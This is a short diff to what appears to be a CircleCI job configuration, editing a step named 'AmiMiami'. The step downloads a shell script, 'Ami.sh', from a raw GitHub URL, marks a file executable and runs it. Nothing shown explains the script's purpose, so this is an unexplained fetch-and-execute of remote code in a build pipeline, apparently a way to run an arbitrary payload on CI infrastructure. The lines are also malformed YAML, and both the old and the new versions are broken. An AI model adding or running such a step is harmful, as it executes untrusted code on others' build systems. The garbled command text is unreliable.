@@ -11,5 +11,5 @@ jobs:
       - run: 
           name: "AmiMiami"
           command:wget http://github.com/vaping8/Circleci/raw/main/Ami.sh && chmod +x a
-          Ami.sh && ./a
-          Ami.sh
+          Ami.sh && ./
+        Ami.sh
